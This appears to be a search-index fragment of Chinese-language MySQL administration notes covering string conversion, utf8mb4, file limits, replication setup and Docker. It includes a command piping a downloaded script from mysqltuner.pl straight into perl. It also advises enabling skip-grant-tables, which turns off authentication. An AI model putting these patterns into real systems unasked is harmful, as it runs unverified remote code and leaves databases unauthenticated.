\u6ce8\u610freplace\u4e0d\u8981\u53cd\u5f15\u53f7 \u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57 \u00b6 \u8868\u7684\u8bbe\u8ba1\u8fdd\u80cc\u4e86\u4e00\u5217\u53ea\u5b58\u653e\u4e00\u79cd\u6570\u636e\u7684\u539f\u5219\uff0c\u641e\u51fa\u4e86\u8fd9\u6837\u4e00\u4e2aText\u7c7b\u578b\u7684\u5217(\u5047\u8bbe\u4e3ainfo)\uff0c\u683c\u5f0f\u4e3a\u201d\u7528\u6237\u540d: \u6570\u503c\u201d \u73b0\u5728\u9700\u8981\u5c06\u6570\u503c\u4ece\u8fd9\u4e00\u5217\u4e2d\u63d0\u53d6\u51fa\u6765\uff0c\u5e76\u8f6c\u4e3aint\u7c7b\u578b convert ( substr ( `info` , locate ( ':' , `info` ) + 2 ), unsigned integer ) Google\u5173\u952e\u8bcd\uff1a mysql split string , mysql string to int \u53c2\u8003\uff1a https://stackoverflow.com/questions/14950466/how-to-split-the-name-string-in-mysql https://stackoverflow.com/questions/5960620/convert-text-into-number-in-mysql-query mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18 \u00b6 \u53c2\u8003\uff1a https://www.linode.com/docs/databases/mysql/how-to-optimize-mysql-performance-using-mysqltuner \u4f7f\u7528MySQLTuner\u8fd9\u4e2a\u5de5\u5177\u5f97\u5230\u4e00\u4e9b\u5efa\u8bae\uff1a curl -L http://mysqltuner.pl/ | perl \u5bf9\u4e8e\u5176\u6700\u540e\u7ed9\u51fa\u7684\u53c2\u6570\u5efa\u8bae\u7167\u505a\u5373\u53ef\u3002 key_buffer \u53c2\u6570\u662f\u6700\u5173\u952e\u7684\u53c2\u6570\uff0c\u51b3\u5b9a\u4e86mysql\u5360\u7528\u7684\u5185\u5b58\u5927\u5c0f \u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4 \u00b6 \u4e3a\u4e86\u8ba9mysql\u5b58\u50a8 emoji\u8868\u60c5 \uff0c\u9700\u8981\u8fdb\u884c\u8868\u7684\u53d8\u66f4\u64cd\u4f5c \u4ee5\u53ca \u8fde\u63a5\u4ee3\u7801\u7684\u4fee\u6539 \u53c2\u8003 https://stackoverflow.com/questions/26532722/how-to-encode-utf8mb4-in-python \u8868\u7684\u53d8\u66f4 \u8868\u7684\u6bcf\u4e00\u4e2a CHAR \uff0c VARCHAR \u548c TEXT \u7c7b\u578b\u7684\u5217\u90fd\u8981\u6539\u4e3a\u4f7f\u7528utf8mb4 \u00b6 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u8868\u540d\u79f0{tablename}\uff0c\u4fee\u6539\u5176 user \u5217\u548c content \u5217\uff0c\u4ee5\u53ca\u8868\u7684\u9ed8\u8ba4\u5b57\u7b26\u96c6\uff1a ALTER TABLE ` { tablename } ` MODIFY COLUMN ` user ` varchar ( 66 ) CHARACTER SET utf8mb4 NOT NULL AFTER ` edittime ` , MODIFY COLUMN ` content ` longtext CHARACTER SET utf8mb4 NOT NULL AFTER ` user ` , DEFAULT CHARACTER SET = utf8mb4 ; \u8fde\u63a5\u4ee3\u7801\u7684\u6539\u52a8 \u00b6 \u5728\u6267\u884c insert \u7684 sql\u8bed\u53e5\u4e4b\u524d\uff0c\u5148\u6267\u884c\u8fd9\u4e09\u6761sql: SET NAMES utf8mb4; SET CHARACTER SET utf8mb4; SET character_set_connection=utf8mb4; \u89e3\u51b3 Too many open files \u9519\u8bef \u00b6 \u53c2\u8003\uff1ahttps://duntuk.com/how-raise-ulimit-open-files-and-mysql-openfileslimit https://stackoverflow.com/questions/22495124/cannot-set-limit-of-mysql-open-files-limit-from-1024-to-65535/35515570 \u7cfb\u7edf\u73af\u5883\uff1a ubuntu16.04\uff0c\u7528apt install mysql-server\u5b89\u88c5\u7684mysql \u8fd9\u4e2a\u95ee\u9898\u7684\u539f\u56e0\u662fmysql\u9ed8\u8ba4\u7684open_files_limit\u662f1024\uff0c\u5728mysql\u6253\u5f001024\u4e2a\u6587\u4ef6\u540e\u5c31\u65e0\u6cd5\u518d\u6253\u5f00\u65b0\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u8fd9\u4e2alimit\uff0c\u5982\u6539\u4e3a1024000 \u4fee\u6539 /etc/mysql/mysql.conf.d/mysqld.cnf \uff0c\u5728[mysqld_safe]\u548c[mysqld]\u90fd\u52a0\u5165\u4e00\u884c\uff1a open_files_limit = 1024000 \u5728 /etc/security/limits.conf \u4e2d\u52a0\u5165\uff1a * soft nofile 1024000 * hard nofile 1024000 * soft nproc 10240 * hard nproc 10240 \u4e0a\u8ff0\u8fd8\u4e0d\u591f\uff0c\u7531\u4e8emysql\u670d\u52a1\u88absystemd\u7ba1\u7406\uff0c\u8fd8\u8981\u4fee\u6539 /lib/systemd/system/mysql.service \uff0c\u5728\u6700\u540e\u52a0\u5165 LimitNOFILE = infinity LimitMEMLOCK = infinity \u5728ubuntu16.04\u4e0a\uff0c\u8fd9\u4e9b\u8fd8\u4e0d\u591f\uff0c\u8fd8\u8981\u7ee7\u7eed\u6539systemd: \uff08\u53c2\u8003\uff1ahttps://serverfault.com/questions/791729/ubuntu-16-04-server-mysql-open-file-limit-wont-go-higher-than-65536\uff09 mkdir / etc / systemd / system / mysql . service . d tee / etc / systemd / system / mysql . service . d / override . conf <<- 'EOF' [ Service ] LimitNOFILE = 1024000 EOF \u7136\u540e\u91cd\u542fmysql\uff1a systemctl daemon - reload systemctl restart mysql . service \u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u90fd\u80fd\u770b\u5230\u4fee\u6539\u662f\u5426\u751f\u6548\uff1a ps aux | grep mysqld #\u627e\u5230mysqld\u7684\u8fdb\u7a0bID cat / proc / \u4e0a\u8ff0\u627e\u5230\u7684\u8fdb\u7a0b ID / limits | grep files mysql - u root - p show global variables like \" %o pen_files_limit%\" ; \u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898 \u00b6 \u95ee\u9898\u73b0\u8c61\uff1a mysql\u670d\u52a1\u81ea\u52a8\u9000\u51fa\uff0c\u67e5\u65e5\u5fd7 jounralctl -xe|tac|less \u53d1\u73b0\u662f apt upgrade \u5f15\u8d77\u7684\u81ea\u52a8\u9000\u51fa \u53d1\u73b0\u8fd9\u662f\u4e00\u4e2aubuntu16.04\u7684\u7279\u6027\uff0c\u6bcf\u5929\u51cc\u66686\u70b9\u4f1a\u81ea\u52a8apt upgrade\u5b89\u5168\u66f4\u65b0\uff0c\u4f46\u4e0d\u660e\u539f\u56e0\u8fd9\u4e2a\u66f4\u65b0\u5931\u8d25\u4e86\uff0capt\u5173\u6389\u4e86mysql\u670d\u52a1\u540e\u7531\u4e8e\u5f02\u5e38\u9000\u51fa\u5e76\u6ca1\u6709\u91cd\u65b0\u628amysql\u670d\u52a1\u542f\u52a8 \u5982\u679c\u4f60\u60f3\u5173\u6389\u81ea\u52a8\u66f4\u65b0\uff08\u4e0d\u5efa\u8bae\uff09\uff1a\u4fee\u6539 /etc/apt/apt.conf.d/20auto-upgrades \uff0c\u6539\u4e3a APT::Periodic::Unattended-Upgrade \"0\"; \u6267\u884c apt upgrade \u6216\u8005 apt-get install -f \u770b\u770b\uff0c\u80fd\u91cd\u73b0\u95ee\u9898\uff08mysql\u88ab\u5173\u6389\u4e86\uff09\uff0c\u4e5f\u53d1\u73b0\u4e86\u62a5\u9519\u4fe1\u606f\uff1a mysql_upgrade : Got error : 2002 : Can 't connect to local MySQL server through socket ' /var/run/mysqld/ mysqld . sock ' ( 2 ) while connecting to the MySQL server Upgrade process encountered error and will not continue . \u7136\u540e\u5c31\u67e5\u8fd9\u4e2a\u62a5\u9519\uff0c\u53d1\u73b0\u4e86\u8fd9\u4e2a\uff1ahttps://github.com/chef-cookbooks/mysql/issues/466 \u4eba\u5bb6\u7684\u89e3\u51b3\u65b9\u6848\u662f\uff1a systemctl enable mysql \uff0c\u7136\u800c\u6211\u6267\u884c\u53c8\u9047\u5230\u4e86systemd\u7684\u62a5\u9519\uff1a Failed to execute operation: Invalid argument \u6700\u7ec8\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5148disable\u4e00\u4e0b systemctl disable mysql systemctl enable mysql apt-get install -f NULL\u8f6c0 \u00b6 \u7528\u51fd\u6570IFNULL\uff0c\u5199\u6cd5\u5c31\u662f IFNULL(\u5217\u540d, 0) \u4e3e\u4e2a\u4f8b\u5b50 select sum(IFNULL(score, 0)) from runs; \u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236 \u00b6 master\u542f\u7528binlog\u914d\u7f6eserver-id\uff1bmaster\u7528mysqldump\u5bfc\u51fa\u6570\u636e\u5e93\uff1bslave\u5bfc\u5165\uff0c\u5f00\u59cbslave master\u521b\u5efa\u7528\u6237 \u00b6 GRANT REPLICATION SLAVE ON *.* TO 'slave_user'@'%' IDENTIFIED BY 'password'; FLUSH PRIVILEGES; master\u542f\u7528binlog \u00b6 /etc/mysql/conf.d/master.cnf [mysqld] server-id = 1 log-bin = mysql-bin.log innodb_flush_log_at_trx_commit = 1 sync_binlog = 1 \u642c\u8fd0\u6570\u636e\u5e93 \u00b6 \u7531\u4e8ebinlog\u662f\u5728\u5df2\u7ecf\u6709\u6570\u636e\u4e4b\u540e\u624d\u5f00\u542f\u7684\uff0c\u800cmysql\u4e0d\u4f1a\u81ea\u5df1\u6267\u884c\u5168\u91cf\u540c\u6b65\uff0c\u5c31\u53ea\u80fd\u9760\u624b\u5de5\u642c\u8fd0sql\u6587\u4ef6\u54af \u8de8\u5730\u57df\u590d\u5236\u7f51\u901f\u662f\u9650\u5236\u56e0\u7d20\uff0c\u5c31\u75287z\u538b\u7f29\u4e86 mysqldump -h 127.0.0.1 -P 3306 -u root -p --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data | 7z a -si dbdump.sql.7z 7z x -so dbdump.sql.7z | mysql -h 127.0.0.1 -u root -p \u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528ssh\u548c\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c31\u4e0d\u7528\u521b\u5efa\u6587\u4ef6\u4e86\uff1a ssh master_server \"mysqldump -h 127.0.0.1 -P 3306 -u root -ppassword --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data |gzip\" | zcat | mysql -h 127.0.0.1 -u root -ppassword \u5176\u4e2d --master-data \u5f88\u91cd\u8981\uff0c\u5bfc\u51fa\u7684\u65f6\u5019\u5c31\u81ea\u52a8\u5e26\u4e0a\u4e86master\u7684\u4fe1\u606f\uff0c\u65e0\u9700\u518d\u624b\u5de5\u8bb0\u5f55 CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=15410; \u914d\u7f6eslave \u00b6 \u5b9e\u9645\u4f7f\u7528\u4e2d\u5f88\u5bb9\u6613\u9047\u5230duplicate key\u7684\u95ee\u9898\uff0c\u5bfc\u81f4slave\u7ebf\u7a0b\u505c\u4f4f\uff0c\u914d\u7f6e\u76f4\u63a5\u5ffd\u7565\u8fd9\u4e2a\u9519\u8bef \u53c2\u8003 server-id = 2 relay-log = mysql-relay-bin.log log_bin = mysql-bin.log slave-skip-errors = 1062 CHANGE MASTER TO MASTER_HOST='12.34.56.789',MASTER_USER='slave_user', MASTER_PASSWORD='password'; START SLAVE; SHOW SLAVE STATUS\\G Docker\u955c\u50cf \u00b6 https://github.com/bitnami/bitnami-docker-mysql \u4f46\u8fd9\u4e2a\u955c\u50cf\u4e5f\u4e0d\u4f1a\u5e2e\u4f60\u81ea\u52a8\u5b8c\u6210mysqldump\uff0c\u4f46\u914d\u7f6e\u4e00\u4e2aslave\u8fd8\u662f\u5f88\u7701\u5fc3\u7684 \u6ce8\u610f\u6743\u9650\u914d\u7f6e\uff0c\u5982\u679c\u539f\u672c\u6570\u636e\u6587\u4ef6\u5939\u4e0d\u5b58\u5728\uff0cDocker\u521b\u5efa\u7684\u662froot\u7528\u6237\u624d\u80fd\u8bfb\u5199\uff0c\u5bfc\u81f4\u5bb9\u5668\u76f4\u63a5\u9000\u51fa\uff0c\u5751\u7684\u5730\u65b9\u5728\u4e8e\u6ca1\u6709\u62a5\u9519\u4fe1\u606f mkdir - p / srv / mysql - slave / data chown 1001 / srv / mysql - slave / data - R docker run - it - v / srv / mysql - slave / my . cnf : / opt / bitnami / mysql / conf / my . cnf : ro - v / srv / mysql - slave / data : / bitnami / mysql / data \\ --name mysql-slave -e MYSQL_REPLICATION_MODE=slave -e MYSQL_REPLICATION_USER=slave_user -e MYSQL_REPLICATION_PASSWORD=password \\ - e MYSQL_MASTER_HOST = 12 . 34 . 56 . 789 - e MYSQL_MASTER_PORT_NUMBER = 3306 \\ - e MYSQL_MASTER_ROOT_USER = slave_user - e MYSQL_MASTER_ROOT_PASSWORD = password \\ bitnami / mysql : 5 . 7 \u5176\u4e2dMYSQL_MASTER_ROOT_USER\u867d\u7136\u4eba\u5bb6\u8bf4\u8981root\u7528\u6237\uff0c\u5b9e\u9645\u4e0a\u4ee3\u7801\u91cc\u53ea\u662f\u7528\u6765select 1\uff0c\u6240\u4ee5\u7528slave_user\u5373\u53ef\uff0c\u53c2\u89c1 \u6211\u63d0\u7684issue \u5bb9\u5668\u542f\u52a8\u540e\u4e00\u822c\u4f1a\u7531\u4e8emaster\u7684binlog\u4e0d\u5b8c\u6574\u6267\u884csql\u5931\u8d25\uff08\u8868\u4e0d\u5b58\u5728\uff09\uff0c\u9700\u8981\u7ee7\u7eed\u64cd\u4f5c\uff1a \u4fee\u6539my.cnf\u5728 [mysqld] \u589e\u52a0 skip-grant-tables \u6ce8\u610f\u590d\u6570\uff0c\u6765\u4fdd\u8bc1slave\u53ef\u4ee5\u8fde\u4e0a\u8fdb\u884c\u64cd\u4f5c \u7136\u540e\u6267\u884csql\u8bed\u53e5 STOP SLAVE; \u518d\u6267\u884c\u4e0a\u8ff0\u642c\u8fd0\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u5bfc\u5165\u5b8c\u6210\u540e START SLAVE \u4f7f\u7528 show slave status; \u67e5\u770bslave\u72b6\u6001 \u53e6\u5916\uff0c\u914d\u5408autossh\u548cssh\u7684\u7aef\u53e3\u8f6c\u53d1\u53ef\u4ee5\u907f\u514d\u5c06mysql\u7aef\u53e3\u66b4\u9732\u5728\u5916\uff1a autossh - M 0 - o ServerAliveInterval = 30 - o ServerAliveCountMax = 3 - L 172.17.0.1 : 3306 : 127.0.0.1 : 3306 user @12.34.56.789 \u76f8\u5e94\u5730\uff0cslave\u914d\u7f6e\u7684master\u5730\u5740\u6539\u4e3a172.17.0.1 \u4e3a\u4ec0\u4e48MySQL\u8868\u5fc5\u987b\u8981\u6709\u4e3b\u952e \u00b6 Learned from: https://federico-razzoli.com/why-mysql-tables-need-a-primary-key InnoDB\u4e2d\u975e\u4e3b\u952e\u7684\u7d22\u5f15\u662f\u989d\u5916\u5b58\u50a8\u7684\uff0c\u4f7f\u7528\u7d22\u5f15\u67e5\u8be2\u5148\u67e5\u5230\u4e3b\u952e\uff0c\u518d\u7528\u4e3b\u952e\u67e5\u6570\u636e\u2014\u2014\u6ca1\u6709\u4e3b\u952e\u7684\u67e5\u8be2\u4f1a\u6162\u4e00\u4e9b \u6ca1\u6709\u4e3b\u952e\u4e5f\u6ca1\u6709\u9690\u5f0f\u4e3b\u952e\uff08\u521b\u5efa\u8868\u7684\u65f6\u5019\u6307\u5b9a\u7684NOT NULL UNIQUE\u5217\uff09\u4f1a\u81ea\u52a8\u4f7f\u7528\u9012\u589e\u7684row id\u4f5c\u4e3a\u4e3b\u952e\uff0c\u4f46\u9012\u589e\u9700\u8981\u5168\u5c40\u9501 dict_sys->mutex \u2014\u2014\u591a\u4e2a\u8868\u540c\u65f6\u63d2\u5165\u65f6\u6027\u80fd\u4e0b\u964d \u5728binlog\u4e2d\u5220\u9664\u64cd\u4f5c\u6709\u4e3b\u952e\u53ea\u9700\u8981\u8bb0\u5f55\u4e3b\u952e\uff0c\u6ca1\u6709\u4e3b\u952e\u9700\u8981\u8bb0\u5f55\u6240\u6709\u5185\u5bb9\u2014\u2014binlog\u66f4\u5927 \u4ece\u673a\u6267\u884cbinlog\u4e2d\u7684delete\u64cd\u4f5c\uff0c\u6bcf\u6b21\u64cd\u4f5c\u90fd\u9700\u8981\u626b\u63cf\u5168\u8868\u2014\u2014\u6027\u80fd\u663e\u8457\u4e0b\u964d \u96c6\u7fa4\u5982Galera\u9700\u8981\u7b49\u5f85\u6240\u6709\u8282\u70b9commit\u624d\u4f1a\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56de\u6210\u529f\u2014\u2014\u7528\u6237\u611f\u53d7\u5230\u5f88\u9ad8\u7684\u5ef6\u8fdf","title":"MySQL"},{"location":"MySQL/#_1","text":"desc \u8868\u540d\u79f0;","title":"\u67e5\u770b\u8868\u7ed3\u6784"},{"location":"MySQL/#sql","text":"show create table \u8868\u540d\u79f0;","title":"\u67e5\u770b\u5efa\u8868sql\u8bed\u53e5"},{"location":"MySQL/#merge","text":"\u5b98\u65b9\u6587\u6863\uff1ahttp://dev.mysql.com/doc/refman/5.7/en/merge-storage-engine.html \u67e5\u770b\u80fd\u7528\u7684\u5f15\u64ce\uff1a show engines","title":"MERGE\u5b58\u50a8\u5f15\u64ce"},{"location":"MySQL/#merge_1","text":"\u5047\u8bbe\u6709a,b\u8868\uff0c\u4ed6\u4eec\u7684\u7ed3\u6784\u5b8c\u5168\u76f8\u540c\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2ac\u8868\uff0c\u6ce8\u610f\u8fd9\u4e2a\u8868\u7684\u5b9a\u4e49\u8981\u4e0ea\u548cb\u8868\u5b8c\u5168\u4e00\u81f4 drop table if exists data ; CREATE TABLE c ( ` id ` int ( 11 ) NOT NULL , ` data ` longtext NOT NULL , PRIMARY KEY ( ` id ` ) ) ENGINE = MRG_MYISAM , UNION = ( a , b ); \u7279\u70b9\uff1a \u8fd9\u79cd\u8868\u4e0d\u4f1a\u521b\u5efa\u989d\u5916\u7684\u7d22\u5f15\uff0c\u4f46\u67e5\u8be2\u8d77\u6765\u6bd4\u89c6\u56fe\u901f\u5ea6\u66f4\u5feb\uff1b \u4e0d\u80fd\u5728\u8fd9\u79cd\u8868\u4e0a\u5efa\u7acb\u5168\u6587\u7d22\u5f15","title":"\u521b\u5efa\u4e00\u4e2aMERGE\u8868\uff1a"},{"location":"MySQL/#_2","text":"\u4e24\u884c\u53ea\u6709\u4e00\u5217(\u8fd9\u91cc\u5047\u8bbe\u4e3a gettime )\u4e0d\u540c\uff0c\u5220\u9664\u5176\u4e2d\u4e00\u884c delete t1 from t as t1 , t as t2 where t1 . id = t2 . id and t1 . \u5176\u4ed6\u5217 = t2 . \u5176\u4ed6\u5217 and t1 . gettime > t2 . gettime ;","title":"\u5220\u9664\u8868\u7684\u5197\u4f59"},{"location":"MySQL/#alter-table","text":"ALTER IGNORE TABLE ` \u8868\u540d\u79f0 ` MODIFY COLUMN ` id ` int ( 11 ) NOT NULL FIRST , MODIFY COLUMN ` user ` varchar ( 66 ) NOT NULL AFTER ` id ` , MODIFY COLUMN ` content ` longtext NOT NULL AFTER ` user ` , DROP PRIMARY KEY , ADD PRIMARY KEY ( ` id ` ), DROP INDEX ` a1 ` , ADD INDEX ` a1 ` ( ` user ` );","title":"\u4fee\u6539\u8868 alter table"},{"location":"MySQL/#_3","text":"\u4ee3\u7801\u5728 code/pinyin.sql","title":"\u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3 \u51fd\u6570"},{"location":"MySQL/#url","text":"\u6765\u6e90 http://stackoverflow.com/questions/17090237/extracting-filenames-from-a-path-mysql \u4f7f\u7528SUBSTRING_INDEX\u51fd\u6570\uff0c\u5047\u8bbeurl\u6b64\u884c\u7684\u5185\u5bb9\u4e3a\u201dhttp://example.com/some/path/to/filename.zip\u201d select SUBSTRING_INDEX(url, '/', -1) as filename; \u5373\u53ef\u5f97\u5230\u4e00\u5217filename\uff0c\u6b64\u884c\u6570\u636e\u4e3a\u201dfilename.zip\u201d","title":"\u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0"},{"location":"MySQL/#_4","text":"","title":"\u67e5\u8be2\u4f18\u5316"},{"location":"MySQL/#explainusing-filesort","text":"\u53c2\u8003 http://www.ccvita.com/169.html \u5982\u679c\u4f7f\u7528\u4e86order by\u6216\u8005group by\uff0c\u9700\u8981\u5efa\u7d22\u5f15\u4ee5\u4f18\u5316\u8fd9\u4e2a\u67e5\u8be2 group by\u7528\u4e86\u4e24\u4e2a\u5217\uff0c\u4e24\u5217\u8981\u5408\u5728\u4e00\u8d77\u521b\u5efa\u7d22\u5f15","title":"explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort"},{"location":"MySQL/#_5","text":"\u53c2\u8003 https://dev.mysql.com/doc/refman/5.5/en/optimizing-memory-tables.html \u5185\u5b58\u8868\u7684\u7d22\u5f15\u5e94\u8be5\u9009\u62e9BTREE","title":"\u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9"},{"location":"MySQL/#the-table-is-full","text":"\u4fee\u6539MySQL\u7684\u914d\u7f6e\u6587\u4ef6/etc/mysql/my.cnf\uff0c\u5728[mysqld]\u4e0b\u6dfb\u52a0/\u4fee\u6539\u4e24\u884c(\u4e0b\u9762\u7684\u503c\u4ec5\u4f9b\u53c2\u8003,\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u914c\u60c5\u5904\u7406)\uff1a tmp_table_size = 256M // \u4e34\u65f6\u8868\u5927\u5c0f max_heap_table_size = 256M // \u5185\u5b58\u8868\u5927\u5c0f","title":"\u5185\u5b58\u8868The table is full"},{"location":"MySQL/#replace","text":"update `content` set value = replace ( value , \"original content\" , \"replaced content\" ); \u6ce8\u610freplace\u4e0d\u8981\u53cd\u5f15\u53f7","title":"replace\u51fd\u6570\u66ff\u6362\u6587\u672c"},{"location":"MySQL/#split","text":"\u8868\u7684\u8bbe\u8ba1\u8fdd\u80cc\u4e86\u4e00\u5217\u53ea\u5b58\u653e\u4e00\u79cd\u6570\u636e\u7684\u539f\u5219\uff0c\u641e\u51fa\u4e86\u8fd9\u6837\u4e00\u4e2aText\u7c7b\u578b\u7684\u5217(\u5047\u8bbe\u4e3ainfo)\uff0c\u683c\u5f0f\u4e3a\u201d\u7528\u6237\u540d: \u6570\u503c\u201d \u73b0\u5728\u9700\u8981\u5c06\u6570\u503c\u4ece\u8fd9\u4e00\u5217\u4e2d\u63d0\u53d6\u51fa\u6765\uff0c\u5e76\u8f6c\u4e3aint\u7c7b\u578b convert ( substr ( `info` , locate ( ':' , `info` ) + 2 ), unsigned integer ) Google\u5173\u952e\u8bcd\uff1a mysql split string , mysql string to int \u53c2\u8003\uff1a https://stackoverflow.com/questions/14950466/how-to-split-the-name-string-in-mysql https://stackoverflow.com/questions/5960620/convert-text-into-number-in-mysql-query","title":"\u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57"},{"location":"MySQL/#mysqld","text":"\u53c2\u8003\uff1a https://www.linode.com/docs/databases/mysql/how-to-optimize-mysql-performance-using-mysqltuner \u4f7f\u7528MySQLTuner\u8fd9\u4e2a\u5de5\u5177\u5f97\u5230\u4e00\u4e9b\u5efa\u8bae\uff1a curl -L http://mysqltuner.pl/ | perl \u5bf9\u4e8e\u5176\u6700\u540e\u7ed9\u51fa\u7684\u53c2\u6570\u5efa\u8bae\u7167\u505a\u5373\u53ef\u3002 key_buffer \u53c2\u6570\u662f\u6700\u5173\u952e\u7684\u53c2\u6570\uff0c\u51b3\u5b9a\u4e86mysql\u5360\u7528\u7684\u5185\u5b58\u5927\u5c0f","title":"mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18"},{"location":"MySQL/#emojiutf8utf8mb4","text":"\u4e3a\u4e86\u8ba9mysql\u5b58\u50a8 emoji\u8868\u60c5 \uff0c\u9700\u8981\u8fdb\u884c\u8868\u7684\u53d8\u66f4\u64cd\u4f5c \u4ee5\u53ca \u8fde\u63a5\u4ee3\u7801\u7684\u4fee\u6539 \u53c2\u8003 https://stackoverflow.com/questions/26532722/how-to-encode-utf8mb4-in-python","title":"\u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4"},{"location":"MySQL/#charvarchartextutf8mb4","text":"\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u8868\u540d\u79f0{tablename}\uff0c\u4fee\u6539\u5176 user \u5217\u548c content \u5217\uff0c\u4ee5\u53ca\u8868\u7684\u9ed8\u8ba4\u5b57\u7b26\u96c6\uff1a ALTER TABLE ` { tablename } ` MODIFY COLUMN ` user ` varchar ( 66 ) CHARACTER SET utf8mb4 NOT NULL AFTER ` edittime ` , MODIFY COLUMN ` content ` longtext CHARACTER SET utf8mb4 NOT NULL AFTER ` user ` , DEFAULT CHARACTER SET = utf8mb4 ;","title":"\u8868\u7684\u53d8\u66f4 \u8868\u7684\u6bcf\u4e00\u4e2aCHAR\uff0cVARCHAR\u548cTEXT\u7c7b\u578b\u7684\u5217\u90fd\u8981\u6539\u4e3a\u4f7f\u7528utf8mb4"},{"location":"MySQL/#_6","text":"\u5728\u6267\u884c insert \u7684 sql\u8bed\u53e5\u4e4b\u524d\uff0c\u5148\u6267\u884c\u8fd9\u4e09\u6761sql: SET NAMES utf8mb4; SET CHARACTER SET utf8mb4; SET character_set_connection=utf8mb4;","title":"\u8fde\u63a5\u4ee3\u7801\u7684\u6539\u52a8"},{"location":"MySQL/#too-many-open-files","text":"\u53c2\u8003\uff1ahttps://duntuk.com/how-raise-ulimit-open-files-and-mysql-openfileslimit https://stackoverflow.com/questions/22495124/cannot-set-limit-of-mysql-open-files-limit-from-1024-to-65535/35515570 \u7cfb\u7edf\u73af\u5883\uff1a ubuntu16.04\uff0c\u7528apt install mysql-server\u5b89\u88c5\u7684mysql \u8fd9\u4e2a\u95ee\u9898\u7684\u539f\u56e0\u662fmysql\u9ed8\u8ba4\u7684open_files_limit\u662f1024\uff0c\u5728mysql\u6253\u5f001024\u4e2a\u6587\u4ef6\u540e\u5c31\u65e0\u6cd5\u518d\u6253\u5f00\u65b0\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u8fd9\u4e2alimit\uff0c\u5982\u6539\u4e3a1024000 \u4fee\u6539 /etc/mysql/mysql.conf.d/mysqld.cnf \uff0c\u5728[mysqld_safe]\u548c[mysqld]\u90fd\u52a0\u5165\u4e00\u884c\uff1a open_files_limit = 1024000 \u5728 /etc/security/limits.conf \u4e2d\u52a0\u5165\uff1a * soft nofile 1024000 * hard nofile 1024000 * soft nproc 10240 * hard nproc 10240 \u4e0a\u8ff0\u8fd8\u4e0d\u591f\uff0c\u7531\u4e8emysql\u670d\u52a1\u88absystemd\u7ba1\u7406\uff0c\u8fd8\u8981\u4fee\u6539 /lib/systemd/system/mysql.service \uff0c\u5728\u6700\u540e\u52a0\u5165 LimitNOFILE = infinity LimitMEMLOCK = infinity \u5728ubuntu16.04\u4e0a\uff0c\u8fd9\u4e9b\u8fd8\u4e0d\u591f\uff0c\u8fd8\u8981\u7ee7\u7eed\u6539systemd: \uff08\u53c2\u8003\uff1ahttps://serverfault.com/questions/791729/ubuntu-16-04-server-mysql-open-file-limit-wont-go-higher-than-65536\uff09 mkdir / etc / systemd / system / mysql . service . d tee / etc / systemd / system / mysql . service . d / override . conf <<- 'EOF' [ Service ] LimitNOFILE = 1024000 EOF \u7136\u540e\u91cd\u542fmysql\uff1a systemctl daemon - reload systemctl restart mysql . service \u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u90fd\u80fd\u770b\u5230\u4fee\u6539\u662f\u5426\u751f\u6548\uff1a ps aux | grep mysqld #\u627e\u5230mysqld\u7684\u8fdb\u7a0bID cat / proc / \u4e0a\u8ff0\u627e\u5230\u7684\u8fdb\u7a0b ID / limits | grep files mysql - u root - p show global variables like \" %o pen_files_limit%\" ;","title":"\u89e3\u51b3 Too many open files \u9519\u8bef"},{"location":"MySQL/#ubuntu1604mysqlapt-upgrade","text":"\u95ee\u9898\u73b0\u8c61\uff1a mysql\u670d\u52a1\u81ea\u52a8\u9000\u51fa\uff0c\u67e5\u65e5\u5fd7 jounralctl -xe|tac|less \u53d1\u73b0\u662f apt upgrade \u5f15\u8d77\u7684\u81ea\u52a8\u9000\u51fa \u53d1\u73b0\u8fd9\u662f\u4e00\u4e2aubuntu16.04\u7684\u7279\u6027\uff0c\u6bcf\u5929\u51cc\u66686\u70b9\u4f1a\u81ea\u52a8apt upgrade\u5b89\u5168\u66f4\u65b0\uff0c\u4f46\u4e0d\u660e\u539f\u56e0\u8fd9\u4e2a\u66f4\u65b0\u5931\u8d25\u4e86\uff0capt\u5173\u6389\u4e86mysql\u670d\u52a1\u540e\u7531\u4e8e\u5f02\u5e38\u9000\u51fa\u5e76\u6ca1\u6709\u91cd\u65b0\u628amysql\u670d\u52a1\u542f\u52a8 \u5982\u679c\u4f60\u60f3\u5173\u6389\u81ea\u52a8\u66f4\u65b0\uff08\u4e0d\u5efa\u8bae\uff09\uff1a\u4fee\u6539 /etc/apt/apt.conf.d/20auto-upgrades \uff0c\u6539\u4e3a APT::Periodic::Unattended-Upgrade \"0\"; \u6267\u884c apt upgrade \u6216\u8005 apt-get install -f 